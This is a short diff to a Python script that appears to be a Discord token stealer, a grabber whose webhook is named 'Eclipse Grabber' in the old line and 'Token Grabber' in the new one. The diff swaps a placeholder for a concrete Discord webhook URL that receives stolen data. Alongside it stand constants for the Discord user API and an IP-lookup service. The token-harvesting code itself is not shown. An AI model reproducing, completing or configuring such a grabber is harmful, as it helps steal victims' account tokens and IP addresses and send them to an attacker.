@@ -9,7 +9,7 @@ from typing import List, Optional
 from urllib.request import Request, urlopen
 
 # Constants
-WEBHOOK = "{WEBHOOK}"
+WEBHOOK = "https://discord.com/api/webhooks/1449111593769238579/8D_ZEonuolGAE6wa2JcKtsYCXEyUQf9e0Y_iOTTJ_3Lf2wV4hl66UpBdUpoH8vUoQobV"
 IPIFY_API_URL = "https://api.ipify.org?format=json"
 DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
 DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
@@ -175,7 +175,7 @@ def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Eclipse Grabber",
+        "username": "Token Grabber",
         "avatar_url": "https://imgur.com/Ymo8GEe.png"
     }
 
